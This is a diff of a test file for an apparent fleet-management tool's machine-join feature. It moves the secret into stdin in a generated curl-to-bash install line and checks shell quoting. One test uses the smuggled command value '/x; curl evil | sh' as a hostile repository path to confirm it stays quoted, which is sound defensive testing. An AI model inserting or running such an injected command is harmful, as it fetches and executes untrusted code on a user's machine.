@@ -53,7 +53,7 @@ describe('a machine joining', () => {
         prompt: `You crew the Aeolus ship mac-studio. Register with ship id ${COMMISSIONED_SHIP_ID} and secret ${secret}.`,
         crewLines: [{ harness: 'claude-code', line: `/aeolus:crew ${FLEET_URL} ${COMMISSIONED_SHIP_ID} ${secret}` }],
         secret,
-        setupLine: `curl -fsSL https://raw.githubusercontent.com/ThomasHendrickx/aeolus-fleet-trierarch/main/install.sh | sh -s -- --fleet-url ${FLEET_URL} --ship-id ${COMMISSIONED_SHIP_ID} --plugin-ship-id ${SHIP_ID} --secret ${secret}`,
+        setupLine: `bash <(curl -fsSL https://raw.githubusercontent.com/ThomasHendrickx/aeolus-fleet-trierarch/main/install.sh) --fleet-url ${FLEET_URL} --ship-id ${COMMISSIONED_SHIP_ID} --plugin-ship-id ${SHIP_ID} --secret-stdin <<< '${secret}'`,
       },
     });
   });
@@ -63,13 +63,13 @@ describe('a machine joining', () => {
       options: { harnesses: ['claude-code', 'codex'], unattended: ['claude-code'], repositories: { kind: 'list', entries: ['~/code/web', '', "/srv/it's"] } },
     });
 
-    expect(joined.isOk && joined.value.setupLine.endsWith(" --secret aeolus_sk_v1_machine --harnesses claude-code,codex --unattended claude-code --repositories '~/code/web,/srv/it'\\''s'")).toBe(true);
+    expect(joined.isOk && joined.value.setupLine.endsWith(" --secret-stdin --harnesses claude-code,codex --unattended claude-code --repositories '~/code/web,/srv/it'\\''s' <<< 'aeolus_sk_v1_machine'")).toBe(true);
   });
 
-  it('keeps a hostile value inside one quoted word at the end of the line', async () => {
+  it('keeps a hostile repository value inside one quoted word', async () => {
     const joined = await joinWith({ options: { repositories: { kind: 'folder', path: '/x; curl evil | sh' } } });
 
-    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh'")).toBe(true);
+    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh' <<< 'aeolus_sk_v1_machine'")).toBe(true);
   });
 
   it('commissions each join under a new idempotency key', async () => {
